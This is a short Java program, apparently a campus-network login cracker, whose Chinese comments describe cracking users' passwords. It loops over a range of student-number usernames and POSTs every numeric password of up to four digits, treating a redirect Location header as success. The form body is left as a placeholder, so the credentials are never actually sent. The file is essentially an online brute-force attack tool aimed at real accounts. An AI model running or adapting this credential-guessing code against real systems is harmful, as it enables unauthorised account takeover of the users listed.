package cn.ac.iscas.gz.util;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;

public class PostTest {
    String urlString = "https://www.baidu.com/";

    public PostTest() {
    }

    public PostTest(String urlString) {
        this.urlString = urlString;
    }

    // 提交一次用户请求
    private boolean doPost(String user, String password) {
        boolean sucess = false;
        try {
            URL realUrl = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) realUrl
                    .openConnection();
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setInstanceFollowRedirects(false);

            // 提交表单,发送的数据是直接用Firebug截取的然后把用户名，密码部分换成参数
            PrintWriter out = new PrintWriter(conn.getOutputStream());
            out.print("要提交的表单信息");
            out.flush();
            int code=conn.getResponseCode();
            System.out.println(code);
           String adc= conn.getRequestMethod();
            System.out.println(adc);

            Object object=conn.getContent();
            System.out.println(object);
            String abc=conn.getResponseMessage();
            System.out.println(abc);

            // 如果登录不成功，报头中没有Location字段，getHeaderField("Location") 返回null
            // 登录成功，返回一个随机的Location字段
            // System.out.println(conn.getHeaderFields());
           // System.out.println(user+"---");
          //  System.out.println(password+"---");
            if (conn.getHeaderField("Location") != null) {
                sucess = true;
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return sucess;
    }

    // 这是一个全排列算法, 对特定长度的密码排列组合，把结果存入list
    // user:用户名 ， n:字符下标 ， len：字符数组长度,也就是密码长度
    private boolean createPassWord(String user, char[] str, int n, int len) {
        if (n == len) {
            String ps = new String(str);
            if (doPost(user, ps)) {
//              System.out.println("sucess:" + user + " : " + ps);
               // TextFile.write("file/校园网用户名及密码.txt", true, "sucess:" + user
                     //   + " : " + ps + "\n");
                System.out.println("123");
                return true;
            }
            return false;
        }
        for (int i = 0; i <= 9; i++) {
            str[n] = (char) (i + '0');
            if (createPassWord(user, str, n + 1, len))
                return true;
        }
        return false;
    }

    // 破解一个用户的密码
    public void test(String user) {
        for (int i = 0; i < 4; i++) {
            if (createPassWord(user, new char[i + 1], 0, i + 1))
                break;
        }
    }

    public static void main(String[] args) {
        PostTest pt = new PostTest();
        for (int i = 1; i <= 9; i++)
            pt.test("09050510" + i);
        for (int i = 10; i <= 31; i++)
            pt.test("0905051" + i);
    }
}